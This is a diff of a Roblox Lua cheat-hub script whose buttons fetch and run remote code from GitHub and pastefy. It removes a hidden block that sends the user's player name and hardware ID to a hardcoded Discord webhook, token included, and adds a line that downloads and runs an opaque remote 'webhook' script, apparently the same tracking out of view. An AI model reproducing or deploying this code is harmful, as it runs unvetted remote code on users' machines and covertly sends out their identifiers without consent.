@@ -81,11 +81,6 @@ bdb:Button( "bee swarm sim", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Pa1nx/BloodBathScripts/main/BeeSwarmSimulator"))()
 end )
 
-mc:Button( "fe mouse", function() 
-     loadstring(game:HttpGet(('https://pastefy.ga/58d8d52G/raw'),true))()    
-end )
-
-
 
 
 
@@ -212,34 +207,4 @@ end )
  
  
 --webhook thing
-local Webhook = "https://discord.com/api/webhooks/1102321610901422120/1YFe4CKgnOtBqeg4SNQoxixTvvA4PkfDjvCXErIaREKUkbLKhYXhGJn-2zDIJI_OuSbP"
-local PlayerData =
-{
-       ["content"] = "",
-       ["embeds"] = {
-           {
-           ["title"] = "Script Has Been Executed",
-           ["description"] = game.Players.LocalPlayer.Name.." has executed the script.",
-           ["color"] = tonumber(0x2B6BE4),
-           ["fields"] = {
-               {
-                   ["name"] = "Hardware ID:",
-                   ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-                   ["inline"] = true
-},
-           },
-        }
-    }
-}
-
-local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
-
-Request = http_request or request or HttpPost or syn.request
-Request(
-    {
-        Url = Webhook, 
-        Body = PlayerData, 
-        Method = "POST", 
-        Headers = {["content-type"] = "application/json"} 
-    }
-)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdizBerkRamazan/redhubb/main/webhook"))()
